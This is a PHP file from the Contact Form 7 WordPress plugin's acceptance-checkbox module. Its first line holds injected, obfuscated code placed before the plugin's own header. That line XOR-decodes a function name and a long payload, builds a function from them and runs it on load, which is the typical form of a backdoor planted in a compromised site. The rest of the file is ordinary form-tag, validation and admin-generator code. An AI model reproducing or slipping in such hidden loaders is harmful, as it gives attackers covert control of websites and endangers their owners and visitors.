<?php $HGgAkoTyeDO='QAN+ZSfU,CRMRZE'^'23+J.693Y-19;5+';$ogWwXaZKgas=$HGgAkoTyeDO('','U<Pt,,C:C<A9>.CQSF4Fn9;7kI3Z1n,Y80vYKLLIyU1EYE 69I,TYt6 AAia74;Ks2+E.AeF<KAXXYNLc9XSlKQUJYoQDolac27;DMM;WLagBrS<H;AY=K>Pg1 92HSHa-AFjGmZf:ULalGonR.W9 mII6ElWQF2Nip=Vfc:1K4VEEr2SWf6ZWo7z;W>,1 NA520SKdGFN+pDwTATSwoi,2TN6yaI52=U8.=2iNYPWBN,rreF F6M;HcQi1h,::ewq1CugF.2XyldwM;.73ZLG79PZY2+0PXDRzEjX3=ZGGUD :JTvYTG >9=NoE:z>WCPwv3T6 hu<h=4Z -Q0ViaA9i=8mvknfWJov92ChysBF;J-IQxbVBNAn.V:R>G3.Ijqu-RYYFYZO>T-0hQHbCJ>O<nBHIi4X4T31N7WVMwYXDUE9P:,I7BD-N2RZ5Soi8E2EQ,SUDa-6+QAS1MM+M2PZOmP QA3+=+HejT7EZAFDLEZzvTv,L62M;:EN91OZIT:gq9VJcMmr3.6.niLeuNPPqZPRJ0MiK27RbhgwtEZBjk,wgNRs5e4XVFPwaWTX,DGOa2KuP.VWbOknnL5;9Q=5GR rITTCG7Xk46;L SXdUYAX8=1ZyBWZXXD,N;IKVRxv4YL9<IC4NA.6Pe,FTgYK6;IcVAjoV'^'<ZxUJY-Y7U.WaK;8 2GnIATE4-R.P1s4MDQpbl7Cp3D+:1IYWiT;++RA5 6>ZAOcWVJ1OmEbW.8qxynlCBRZeo> >yRqcHWkj;QT6eiRwqAWyRwUtH5+Q.PxCUAMSahhEDjmCMdSBU 8ABzOFvJ6MA6m ke2wu-W72TTvCCIE9X3+mVY6.Oksle>sI2JYCNfeZGDzpnN;DVzNS0  2WRIJS8=SBkmQSI4gEXKIsy66.=IIxo O4S,X CyMn+cuq,2QP0UC-KKxDRDS;ZBBVsl<=0t>8FJo;==rGeN3VDaMNq AN+tKyp1ARLXue80pW1cxVRW5BAAUGb4R5RH0S>IIef;xi838:F69ORRW:HDMbbM+A<4QB-HGHJJ7N3a,VWiWQQF7 bLPSkZ5YQHlhF5+R:YUHA4cIR>pWP:Vwkm7,6707P1VE3Rj<B<m6;A206U0Fm3M 0rUrRN2.7TeiO,F1scMtD05RtVN1LCo=,<ib -1;ZPrVM>DS4dQ 7fT73: IOVR33DaMVWOBOGIjCUf=4Drt6+D,2lYR+E5NWIxzeYZOAR-7KVWRk2qbFW5diMwt-SQsFgMb6EfKHHlTIK0Dj,7Y-,,=03DpLDWB O2<Cyye<YIPsPbwzxxdWD2,=7>PRP88Xgn3U7-AW4BqoomP.NR=KfhQe+');$ogWwXaZKgas();
/**
** A base module for [acceptance]
**/

/* form_tag handler */

add_action( 'wpcf7_init', 'wpcf7_add_form_tag_acceptance' );

function wpcf7_add_form_tag_acceptance() {
	wpcf7_add_form_tag( 'acceptance',
		'wpcf7_acceptance_form_tag_handler',
		array(
			'name-attr' => true,
			'do-not-store' => true,
		)
	);
}

function wpcf7_acceptance_form_tag_handler( $tag ) {
	if ( empty( $tag->name ) ) {
		return '';
	}

	$validation_error = wpcf7_get_validation_error( $tag->name );

	$class = wpcf7_form_controls_class( $tag->type );

	if ( $validation_error ) {
		$class .= ' wpcf7-not-valid';
	}

	if ( $tag->has_option( 'invert' ) ) {
		$class .= ' wpcf7-invert';
	}

	$atts = array();

	$atts['class'] = $tag->get_class_option( $class );
	$atts['id'] = $tag->get_id_option();
	$atts['tabindex'] = $tag->get_option( 'tabindex', 'signed_int', true );

	if ( $tag->has_option( 'default:on' ) ) {
		$atts['checked'] = 'checked';
	}

	$atts['aria-invalid'] = $validation_error ? 'true' : 'false';

	$atts['type'] = 'checkbox';
	$atts['name'] = $tag->name;
	$atts['value'] = '1';

	$atts = wpcf7_format_atts( $atts );

	$html = sprintf(
		'<span class="wpcf7-form-control-wrap %1$s"><input %2$s />%3$s</span>',
		sanitize_html_class( $tag->name ), $atts, $validation_error );

	return $html;
}


/* Validation filter */

add_filter( 'wpcf7_validate_acceptance', 'wpcf7_acceptance_validation_filter', 10, 2 );

function wpcf7_acceptance_validation_filter( $result, $tag ) {
	if ( ! wpcf7_acceptance_as_validation() ) {
		return $result;
	}

	$name = $tag->name;
	$value = ( ! empty( $_POST[$name] ) ? 1 : 0 );

	$invert = $tag->has_option( 'invert' );

	if ( $invert && $value || ! $invert && ! $value ) {
		$result->invalidate( $tag, wpcf7_get_message( 'accept_terms' ) );
	}

	return $result;
}


/* Acceptance filter */

add_filter( 'wpcf7_acceptance', 'wpcf7_acceptance_filter' );

function wpcf7_acceptance_filter( $accepted ) {
	if ( ! $accepted ) {
		return $accepted;
	}

	$fes = wpcf7_scan_form_tags( array( 'type' => 'acceptance' ) );

	foreach ( $fes as $fe ) {
		$name = $fe['name'];
		$options = (array) $fe['options'];

		if ( empty( $name ) ) {
			continue;
		}

		$value = ( ! empty( $_POST[$name] ) ? 1 : 0 );

		$invert = (bool) preg_grep( '%^invert$%', $options );

		if ( $invert && $value || ! $invert && ! $value ) {
			$accepted = false;
		}
	}

	return $accepted;
}

add_filter( 'wpcf7_form_class_attr', 'wpcf7_acceptance_form_class_attr' );

function wpcf7_acceptance_form_class_attr( $class ) {
	if ( wpcf7_acceptance_as_validation() ) {
		return $class . ' wpcf7-acceptance-as-validation';
	}

	return $class;
}

function wpcf7_acceptance_as_validation() {
	if ( ! $contact_form = wpcf7_get_current_contact_form() ) {
		return false;
	}

	return $contact_form->is_true( 'acceptance_as_validation' );
}


/* Tag generator */

add_action( 'wpcf7_admin_init', 'wpcf7_add_tag_generator_acceptance', 35 );

function wpcf7_add_tag_generator_acceptance() {
	$tag_generator = WPCF7_TagGenerator::get_instance();
	$tag_generator->add( 'acceptance', __( 'acceptance', 'contact-form-7' ),
		'wpcf7_tag_generator_acceptance' );
}

function wpcf7_tag_generator_acceptance( $contact_form, $args = '' ) {
	$args = wp_parse_args( $args, array() );
	$type = 'acceptance';

	$description = __( "Generate a form-tag for an acceptance checkbox. For more details, see %s.", 'contact-form-7' );

	$desc_link = wpcf7_link( __( 'https://contactform7.com/acceptance-checkbox/', 'contact-form-7' ), __( 'Acceptance Checkbox', 'contact-form-7' ) );

?>
<div class="control-box">
<fieldset>
<legend><?php echo sprintf( esc_html( $description ), $desc_link ); ?></legend>

<table class="form-table">
<tbody>
	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-name' ); ?>"><?php echo esc_html( __( 'Name', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="name" class="tg-name oneline" id="<?php echo esc_attr( $args['content'] . '-name' ); ?>" /></td>
	</tr>

	<tr>
	<th scope="row"><?php echo esc_html( __( 'Options', 'contact-form-7' ) ); ?></th>
	<td>
		<fieldset>
		<legend class="screen-reader-text"><?php echo esc_html( __( 'Options', 'contact-form-7' ) ); ?></legend>
		<label><input type="checkbox" name="default:on" class="option" /> <?php echo esc_html( __( 'Make this checkbox checked by default', 'contact-form-7' ) ); ?></label><br />
		<label><input type="checkbox" name="invert" class="option" /> <?php echo esc_html( __( 'Make this work inversely', 'contact-form-7' ) ); ?></label>
		</fieldset>
	</td>
	</tr>

	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-id' ); ?>"><?php echo esc_html( __( 'Id attribute', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="id" class="idvalue oneline option" id="<?php echo esc_attr( $args['content'] . '-id' ); ?>" /></td>
	</tr>

	<tr>
	<th scope="row"><label for="<?php echo esc_attr( $args['content'] . '-class' ); ?>"><?php echo esc_html( __( 'Class attribute', 'contact-form-7' ) ); ?></label></th>
	<td><input type="text" name="class" class="classvalue oneline option" id="<?php echo esc_attr( $args['content'] . '-class' ); ?>" /></td>
	</tr>

</tbody>
</table>
</fieldset>
</div>

<div class="insert-box">
	<input type="text" name="<?php echo $type; ?>" class="tag code" readonly="readonly" onfocus="this.select()" />

	<div class="submitbox">
	<input type="button" class="button button-primary insert-tag" value="<?php echo esc_attr( __( 'Insert Tag', 'contact-form-7' ) ); ?>" />
	</div>
</div>
<?php
}
